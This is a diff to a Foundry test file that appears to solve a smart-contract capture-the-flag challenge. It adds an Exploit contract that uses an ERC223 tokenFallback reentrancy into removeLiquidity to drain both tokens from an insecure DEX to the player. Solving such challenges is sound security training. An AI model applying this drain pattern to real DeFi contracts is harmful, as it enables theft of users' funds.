@@ -20,8 +20,6 @@ contract Challenge2Test is Test {
     function setUp() public {
         address deployer = makeAddr("deployer");
         vm.startPrank(deployer);
-
-        
         token0 = IERC20(new InSecureumToken(10 ether));
         token1 = IERC20(new SimpleERC223Token(10 ether));
         
@@ -40,27 +38,38 @@ contract Challenge2Test is Test {
         vm.label(address(token1), "SimpleERC223Token");
     }
 
-    function testChallenge() public {  
+    function testChallenge2() public {  
 
-        vm.startPrank(player);
 
         /*//////////////////////////////
         //    Add your hack below!    //
-        //////////////////////////////*/      
+        //////////////////////////////*/
+        Exploit exp = new Exploit(target, token0, token1, player);
+        
+        vm.startPrank(player);
 
-        //============================//
+        token0.transfer(address(exp), 1 ether);
+        token1.transfer(address(exp), 1 ether);
+
+        exp.hack();
+        exp.hack1();
+        exp.hack2();
+
+        console.log("balance of exp in target", target.balanceOf(address(exp)));
 
         vm.stopPrank();
+
+        console.log("token0 player balance", token0.balanceOf(player));
+        console.log("token1 player balance", token1.balanceOf(player));
+        console.log("token0 target balance", token0.balanceOf(address(target)));
+        console.log("token1 target balance", token1.balanceOf(address(target)));
 
         assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
         assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
         assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
         assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");
-
     }
 }
-
-
 
 /*////////////////////////////////////////////////////////////
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
@@ -71,4 +80,44 @@ contract Exploit {
     IERC20 public token0; // this is insecureumToken
     IERC20 public token1; // this is simpleERC223Token
     InsecureDexLP public dex;
+    address owner;
+    
+    bool initialized = false;
+    bool hacked = false;
+
+    constructor(InsecureDexLP _target, IERC20 _token0, IERC20 _token1, address _player){
+        token0 = _token0;
+        token1 = _token1;
+        dex = _target;
+        owner = _player;
+    }
+
+    function hack() public {
+        token0.approve(address(dex), 1 ether);
+        token1.approve(address(dex), 1 ether);
+
+        dex.addLiquidity(1 ether, 1 ether);
+
+        initialized = true;
+    }
+
+    function hack1() public {
+        dex.removeLiquidity(1 ether);
+    }
+
+    function hack2() public {
+        uint256 balance = token0.balanceOf(address(dex));
+        dex.removeLiquidity(balance);
+
+        token0.transfer(owner, token0.balanceOf(address(this)));
+        token1.transfer(owner, token1.balanceOf(address(this)));
+    }
+
+    function tokenFallback(address, uint256, bytes memory ) external {
+        console.log("token fallback");
+        if(initialized && !hacked){
+            hacked = true;
+            dex.removeLiquidity(1 ether);
+        }
+    }
 }
